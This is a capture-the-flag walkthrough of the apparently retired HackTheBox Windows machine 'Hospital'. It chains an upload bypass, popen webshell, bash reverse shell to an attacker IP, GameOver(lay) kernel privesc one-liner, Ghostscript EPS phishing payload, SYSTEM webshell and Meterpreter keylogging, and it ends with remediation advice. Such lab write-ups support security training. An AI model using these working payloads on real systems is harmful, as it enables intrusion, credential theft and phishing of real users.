# Hospital — From a PHP upload bypass to a Ghostscript phish and a SYSTEM webshell

[![Difficulty](https://img.shields.io/badge/difficulty-Medium-yellow)](https://app.hackthebox.com/machines/hospital)
[![OS](https://img.shields.io/badge/OS-Windows-blue)](https://app.hackthebox.com/machines/hospital)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=E8h0qWsBz6c)

> **Attack path:** Upload-filter bypass (`.phar`) + PHP `disable_functions` bypass (`popen`) → www-data on an Ubuntu VM → kernel privesc (GameOver(lay) / CVE-2023-35001) → root → crack `drwilliams` hash → creds valid on Windows + RoundCube → email asks for an `.eps` file → Ghostscript CVE-2023-36664 phish → shell as `drbrown` → `ghostscript.bat` leaks his password → WinRM → XAMPP `htdocs` world-writable (or keylogger) → SYSTEM / Administrator.

Retired box IP: `10.10.11.241`

## 1 · Reconnaissance

### Port scan

```bash
nmap -p- --min-rate 10000 10.10.11.241
nmap -p 22,53,88,135,139,443,445,464,593,636,1801,2103,2105,2107,3268,3269,3389,5985,6404,6407,6410,6617,6644,8080,9389 -sCV 10.10.11.241
```

A Windows Domain Controller (`hospital.htb`, host `DC`) with two webservers bolted on:

- **443** — Apache 2.4.56 (Win64) PHP/8.0.28 — **RoundCube webmail** ("Hospital Webmail", version 1.6.4 from page source; no known exploitable bugs)
- **8080** — Apache 2.4.55 **(Ubuntu)** with a `login.php` page — clearly a second OS
- 22 (SSH, Ubuntu) and 3389 (RDP) both open — the box is a Windows host running an Ubuntu VM

`/etc/hosts`:

```
10.10.11.241 dc dc.hospital.htb hospital.htb
```

SMB has no null access. Fuzzing 443/8080 for vhosts finds nothing.

### Web enumeration on 8080

The app has self-registration. Create an account, log in — there is an "upload medical records" form (`upload.php`) accepting images, and `feroxbuster` shows a `/uploads/` directory that is periodically cleaned:

```bash
feroxbuster -u http://10.10.11.241:8080 -x php
# login.php register.php upload.php success.php config.php uploads/ ...
```

## 2 · Foothold

### Upload filter bypass

In Burp Repeater, replacing the image bytes with plain text still "succeeds" — no magic-byte check. But `.png` files are served raw, and a double extension (`shell.php.png`) is not executed. Fuzz the extension with the HackTricks PHP-extension list:

```bash
ffuf -u http://10.10.11.241:8080/upload.php \
  -H 'Content-Type: multipart/form-data; boundary=---------------------------11902181737497576573931872037' \
  -d $'-----------------------------11902181737497576573931872037\r\nContent-Disposition: form-data; name="image"; filename="lego.FUZZ"\r\nContent-Type: application/x-php\r\n\r\n<?php echo "RCE!"; ?>\r\n-----------------------------11902181737497576573931872037--\r\n' \
  -w php-exts -mr "Location: /success.php"
```

Several extensions pass the filter; requesting them shows only `.phar` executes (the Apache `FilesMatch ".+\.ph(ar|p|tml)$"` handler runs `.phar` as PHP; `.phps` is 403'd).

### disable_functions bypass

`<?php system('whoami'); ?>` uploads but returns empty. Drop in `<?php phpinfo(); ?>` — `disable_functions` lists `system`, `exec`, `shell_exec`, `passthru`, `proc_open`, ... Check what dangerous functions survive:

```php
<?php
foreach (array('system','exec','shell_exec','popen','proc_open','passthru','mail','symlink') as $f)
  if (function_exists($f)) { echo $f . " is enabled<br/>\n"; }
?>
```

**`popen` was forgotten** — a one-line webshell:

```php
<?php echo fread(popen($_REQUEST['cmd'], "r"), 1000000); ?>
```

(p0wny-shell and weevely agents both work here too, also via `popen`.) Upgrade to a reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'
```

`script /dev/null -c bash` + `stty raw -echo` for a TTY. Shell as `www-data` on **Ubuntu 23.04 (kernel 5.19.0-35)** — the "webserver" VM.

## 3 · User flag

### Root the Ubuntu VM (kernel privesc)

`config.php` leaks MySQL creds (`root` / `my$qls3rv1c3!`); the `hospital.users` table holds bcrypt hashes (admin:123456, patient:patient — dead ends). The kernel (Feb 2023) predates two 2023 Ubuntu privescs:

- **GameOver(lay)** — CVE-2023-2640 + CVE-2023-32629 (`overlayfs`), one-liner:

```bash
cd /tmp
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; bash")'
```

- **CVE-2023-35001** (intended; netfilter): build synacktiv's POC (`make`), upload `exploit` + `wrapper`, `chmod +x`, run `./exploit`.

### Crack and reuse drwilliams

As root, pull `/etc/shadow` and crack (mode 1800):

```bash
cat /etc/shadow | grep -P '.{60,}' > shadow
hashcat shadow /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 1800
# drwilliams -> qwe123!@#
```

That password is valid on the Windows host over SMB (no WinRM; SSH only lands back in the VM):

```bash
netexec smb 10.10.11.241 -u drwilliams -p 'qwe123!@#'
```

### Ghostscript phishing (CVE-2023-36664)

Log into RoundCube on 443 as `drwilliams`. The inbox has a mail from **Chris Brown asking for an `.eps` file** to process with Ghostscript. CVE-2023-36664 is command injection via `%pipe%` in EPS filenames:

```bash
python3 CVE_2023_36664_exploit.py --generate --filename needle --extension eps \
  --payload "powershell -e <base64-revshell>"
```

Attach `needle.eps` to a reply. An hMailServer `EventHandlers.vbs` saves the attachment and runs `gswin64c.exe -dNOSAFER` on it as `drbrown`, and the reverse shell catches:

```
PS C:\Users\drbrown.HOSPITAL\Documents> whoami
hospital\drbrown
```

`user.txt` is on the desktop: `<flag>`

### drbrown's own password

`C:\Users\drbrown.HOSPITAL\Documents\ghostscript.bat` (the script that opened the attachment) embeds credentials:

```bat
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;
$c = new-object system.management.automation.pscredential('hospital\drbrown', $p); ..."
```

```bash
netexec winrm 10.10.11.241 -u drbrown -p 'chr!$br0wn'    # (Pwn3d!)
evil-winrm -i 10.10.11.241 -u drbrown -p 'chr!$br0wn'
```

## 4 · Privilege escalation

### Unintended (most common): XAMPP webshell

The DC runs XAMPP (it serves RoundCube on 443) with its webroot at `C:\xampp\htdocs`:

```powershell
icacls C:\xampp\htdocs
# BUILTIN\Users:(I)(CI)(AD)  and  (WD)  -> any user can create files here
```

Drop a webshell (no `disable_functions` on this instance):

```powershell
*Evil-WinRM* PS C:\xampp\htdocs> upload shell.php
*Evil-WinRM* PS C:\xampp\htdocs> type shell.php
<?php system($_REQUEST['cmd']); ?>
```

Request it over HTTPS on 443 — XAMPP's Apache runs as **NT AUTHORITY\SYSTEM**:

```
https://hospital.htb/shell.php?cmd=whoami   ->   nt authority\system
```

Swap the command for a PowerShell reverse shell and catch it with `nc -lnvp 443`.

### Intended: keystroke capture

`qwinsta` shows drbrown has an interactive console session (ID 1). Get Meterpreter in, migrate into that session, and sniff the automation typing the admin password into webmail:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -a x64 -o rev.exe
```

```text
meterpreter > migrate <explorer.exe PID in session 1>
meterpreter > keyscan_start
meterpreter > keyscan_dump
AdministratorTh3B3stH0sp1t4l9786!
```

Validate and shell:

```bash
netexec winrm 10.10.11.241 -u administrator -p 'Th3B3stH0sp1t4l9786!'
evil-winrm -i 10.10.11.241 -u administrator -p 'Th3B3stH0sp1t4l9786!'
```

(RDP as drbrown and revealing the saved IE password, or reading the `OneDriveUpdate` scheduled task's `SyncAppvPublicationServer.vbs`, which contains the same password, are two more routes.)

## 5 · Root flag / Domain Admin

With SYSTEM (webshell) or the Administrator account:

```powershell
PS C:\users\administrator\desktop> type root.txt
<flag>
```

Administrator on the DC is Domain Admin — dump with `secretsdump.py` for the full domain.

## 6 · Impact & remediation

| Risk | Impact | Remediation |
|---|---|---|
| Blocklist-based upload validation (`.phar` allowed, no content check) | Unauthenticated-style RCE as www-data on the webserver | Validate by allowlist + content inspection; keep uploads outside the webroot or force non-executed storage (also drops `.phar` handling) |
| Incomplete PHP `disable_functions` (`popen` enabled) | Any file-write becomes command execution | Use full hardened presets; prefer running PHP with restricted extensions/functions (or mod_security + disable `.phar`) |
| Unpatched Ubuntu kernel (CVE-2023-2640/CVE-2023-32629, CVE-2023-35001) | www-data escalates to root in the VM | Patch kernels; containers/VMs still need patching pipelines |
| Password reuse across Linux VM, Windows domain, and webmail | One cracked `$6$` hash unlocks mail + SMB | Unique credentials per system/tier; SSO with MFA |
| Users processing emailed `.eps` files with Ghostscript `-dNOSAFER` (CVE-2023-36664) | Malicious attachment = code execution as the user | Patch Ghostscript (>= 10.01.2); remove `-dNOSAFER`; sandbox document processing |
| `C:\xampp\htdocs` writable by all users; XAMPP Apache as SYSTEM; cleartext passwords in .bat/.vbs and logged-in webmail | Any shell on the host becomes SYSTEM / Administrator | Fix NTFS ACLs on webroots; run services as least-privilege virtual accounts; never store passwords in scripts |

## 7 · CPTS takeaways

- **File-upload methodology**: always fuzz the extension list against the filter, then verify which extension actually executes — Apache's `.ph(ar|p|tml)$` FilesMatch makes `.phar` a classic here.
- **`disable_functions` is not a security boundary**: enumerate surviving functions (`popen`, `pcntl_*`, `mail`) with a `function_exists` loop (or dfunc-bypasser) and pivot to a shell that uses them.
- Mixed-OS boxes (SSH + WinRM + two Apache server strings) mean **two privesc tracks**: know current Linux kernel exploits (GameOver(lay)) as well as Windows ones.
- **Creds spray across everything** — a cracked Linux `/etc/shadow` hash reused on the DC and webmail is a very CPTS-style pivot; webmail is prime territory for the client-side phishing step (here Ghostscript EPS, CVE-2023-36664).
- On Windows, always `icacls` webroots and check service identities: a world-writable `htdocs` with a SYSTEM Apache is an instant privesc. And when `qwinsta` shows a logged-in user, Meterpreter's `keyscan_start/dump` (after migrating into their session) captures what AV-safe tools miss.
